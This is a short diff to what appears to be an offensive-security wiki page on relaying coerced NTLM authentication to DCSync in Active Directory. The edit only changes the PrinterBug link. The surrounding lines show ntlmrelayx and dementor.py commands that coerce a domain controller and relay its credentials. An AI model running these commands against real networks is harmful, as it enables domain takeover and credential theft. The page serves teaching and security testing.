@@ -32,7 +32,7 @@ In order to operate the attack, the [Impacket](https://github.com/SecureAuthCorp
 ntlmrelayx -t dcsync://$domain_controller_2 -smb2support
 ```
 
-Once the relay servers are up and running and waiting for incoming trafic, attackers need to coerce a Domain Controller's authentication \(or from another account with enough privileges\). One way of doing this is to rely on the [PrinterBug](../mitm-and-coerced-authentications/printerbug.md).
+Once the relay servers are up and running and waiting for incoming trafic, attackers need to coerce a Domain Controller's authentication \(or from another account with enough privileges\). One way of doing this is to rely on the [PrinterBug](../mitm-and-coerced-authentications/ms-rprn.md).
 
 ```bash
 dementor.py -d $domain -u $user -p $password $attacker_ip $domain_controller_1
